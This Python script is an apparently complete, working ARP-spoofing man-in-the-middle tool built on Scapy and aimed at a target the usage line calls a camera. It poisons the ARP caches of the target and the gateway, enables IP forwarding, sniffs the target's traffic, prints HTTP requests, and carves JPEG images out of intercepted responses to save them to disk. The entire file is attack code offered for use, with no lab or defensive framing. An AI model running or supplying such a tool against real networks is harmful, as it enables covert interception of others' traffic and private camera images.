import sys
import os
import time
import threading
import signal

try:
    from scapy.all import *
except ImportError:
    print("[-] Scapy not installed. Please run: pip install scapy")
    sys.exit(1)

# Configuration
conf.verb = 0 # Silent scapy

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    if os.name == 'nt':
        print("[!] Windows detected. Please enable IP Routing manually in Registry/Services if needed.")
    else:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, host_ip):
    """
    Spoofs target_ip says that I (attacker) am host_ip.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    
    # ARP Reply: ip=host_ip, mac=MyMAC -> send to target_ip, target_mac
    # Using sendp (Layer 2) to avoid warnings about missing Ethernet destination
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, verbose=False)
    return True


def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    # Restore connection: target sees real mac of host
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def packet_callback(packet):
    # This filter logic needs to be fast
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        
        # Check for HTTP GET or Responses
        try:
            # Look for HTTP headers in payload
            if b"HTTP" in payload:
                # Basic parsing to see if it's interesting
                if b"GET /" in payload or b"POST /" in payload:
                    print(f"[>] HTTP Request detected: {payload[:50]}...")
                elif b"200 OK" in payload:
                    if b"Content-Type: image" in payload:
                        print(f"[+] Possible IMAGE captured! ({len(payload)} bytes)")
                        # Try to find start of JPEG (FF D8)
                        start = payload.find(b'\xff\xd8')
                        if start != -1:
                            with open(f"captured_{time.time()}.jpg", "wb") as f:
                                f.write(payload[start:])
                                print("[+] Saved potential image to disk.")
        except Exception:
            pass

def main():
    if len(sys.argv) < 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <Target_Camera_IP> <Gateway_IP>")
        return

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    print(f"[*] Starting MITM Attack")
    print(f"    Target : {target_ip}")
    print(f"    Gateway: {gateway_ip}")
    
    enable_ip_forwarding()
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
            print("[-] Could not resolve MAC addresses.")
            sys.exit(1)
            
        print(f"[*] Target MAC: {target_mac}")
        print(f"[*] Gateway MAC: {gateway_mac}")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

    stop_event = threading.Event()

    def spoof_loop():
        try:
            while not stop_event.is_set():
                # Tell Target that Gateway is Me
                spoof(target_ip, gateway_ip) 
                # Tell Gateway that Target is Me
                spoof(gateway_ip, target_ip)
                time.sleep(2)
        except Exception as e:
             print(f"[-] Spoofing error: {e}")

    # Start Spoofing Thread
    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    print("[*] ARP Spoofing started... Press Ctrl+C to stop.")

    # Start Sniffing
    # Filter: IP is target and (TCP or UDP)
    sniffer_filter = f"host {target_ip}"
    print(f"[*] Sniffing filter: {sniffer_filter}")
    
    try:
        sniff(filter=sniffer_filter, prn=packet_callback, store=False)
    except KeyboardInterrupt:
        print("\n[*] Stopping attack...")
        stop_event.set()
        t.join(timeout=1)
        print("[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Done.")

if __name__ == "__main__":
    main()
